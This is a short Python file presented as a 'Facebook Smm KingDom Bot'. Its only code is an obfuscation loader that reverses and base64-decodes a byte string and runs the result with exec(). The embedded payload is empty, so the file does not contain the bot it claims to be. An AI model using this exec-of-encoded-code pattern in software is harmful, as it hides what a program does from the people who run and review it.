# Fares Alex
# Facebook Smm KingDom Bot
# Time: Wed Oct 15 22:18:48 2025
# ----------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))
